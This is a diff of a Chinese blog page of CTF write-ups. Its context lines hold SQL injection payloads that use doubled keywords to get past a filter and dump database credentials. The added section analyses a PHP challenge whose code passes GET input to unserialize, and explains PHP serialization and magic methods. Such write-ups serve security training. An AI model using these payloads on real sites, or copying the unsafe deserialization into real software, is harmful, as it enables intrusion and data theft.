@@ -489,21 +489,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-06
+                    2023-01-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    2.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    11 分
                 </div>
                 
 
@@ -614,6 +614,106 @@
 <p>爆破列名：<br><code>1&#39; ununionion seselectlect 1,2,group_concat(column_name) FRFROMOM infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#39;表名&#39;#</code><br><img src="https://img-blog.csdnimg.cn/489436bf5b2c4bed8b6d663e4c2fc9b3.png" alt="7"></p>
 <p>爆破数据：<br><code>1&#39; uniunionon seleselectct 1,2,group_concat(id,username,passwoorrd) FFROMROM 表名#</code><br>得到flag.<br><img src="https://img-blog.csdnimg.cn/0d1f40d27af84b55a5307d37c9174e27.png" alt="8"></p>
 <h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>本题难度不大，主要进行双写绕过，其中or在被过滤时要注意<strong>information</strong>中的<strong>or</strong>也会过滤，所以要写成<strong>infoorrmation</strong></p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>从题目上来看这是一道php的题目，首页显示存在备份网站的习惯<br><img src="https://img-blog.csdnimg.cn/f4e9a9f0e8dc42e8bbc1e56acfa88747.png" alt="1"><br>然后就了解一下常见备份文件有哪些后缀名？</p>
+<blockquote>
+<p>常见的备份文件后缀名：“.git” 、“.svn”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”</p>
+</blockquote>
+<p>可以用<strong>dirsearch</strong>扫一下</p>
+<blockquote>
+<p>使用</p>
+</blockquote>
+<blockquote>
+<p>-u 指定url</p>
+</blockquote>
+<blockquote>
+<p>-e 指定网站语言</p>
+</blockquote>
+<blockquote>
+<p>-w 可以加上自己的字典（带上路径）</p>
+</blockquote>
+<blockquote>
+<p>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</p>
+</blockquote>
+<p>进入dirsearch目录后</p>
+<p>执行.&#x2F;dirsearch.py -u 127.0.0.1 -e php类似的目录</p>
+<p>这里就不扫描了，最后扫描到<a target="_blank" rel="noopener" href="http://www.zip,在后缀加上他之后保存文件/">www.zip，在后缀加上他之后保存文件</a><br><img src="https://img-blog.csdnimg.cn/d8843158602b47acac1b90a490dcd436.png" alt="2"><br>得到5个文件。</p>
+<blockquote>
+<p>class.php文件</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
+
+
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到，主要意思就是当<strong>username</strong>强相等于<strong>admin</strong>，<strong>password</strong>弱相等于<strong>100</strong>时给出flag，但是需要注意一点的就是程序在执行时，会将<strong>username</strong>赋值为<strong>guest</strong>，这意味着不能得出flag。先放在这里，看看其他文件。</p>
+<blockquote>
+<p>index.php文件</p>
+</blockquote>
+<p>其中有一段内容：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>
+    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们通过get请求传入select参数，并且值被反序列化了（<strong>unserialize</strong>）</p>
+<p>实在不会了，写题步骤请参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/366455343">这位师傅</a></p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>php序列化对象参考规则</strong></p>
+<blockquote>
+<p>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:4:”daye”;}<br>对象类型:长度:”类名”:类中变量的个数:{类型:长度:”值”;类型:长度:”值”;……}<br>变量及对象类型参考<br>a - array         b - boolean<br>d - double         i - integer<br>o - common object     r - reference<br>s - string         C - custom object<br>O - class         N - null<br>R - pointer reference   U - unicode string</p>
+</blockquote>
+<p><strong>private 声明的字段在序列化时，需要注意：</strong></p>
+<blockquote>
+<p>   private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。<br>   因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0（即%00）的前缀。字符串长度也包括所加前缀的长度，如下</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"daye"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 9=7+2  10=8+2  其中2为两个前缀</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">魔术方法</a></p>
+<blockquote>
+<p>下列方法名被认为是魔术方法： __construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 __debugInfo() 。 </p>
+</blockquote>
+<p><strong>序列化与反序列化简单介绍</strong></p>
+<blockquote>
+<p>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize()</p>
+</blockquote>
+<blockquote>
+<p>反序列化:恢复原先被序列化的变量 函数: unserialize()</p>
+</blockquote>
 
                 
             </div>
@@ -1449,7 +1549,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">13.8k</span>&nbsp;字
+                class="white-color">14.6k</span>&nbsp;字
             
             
             
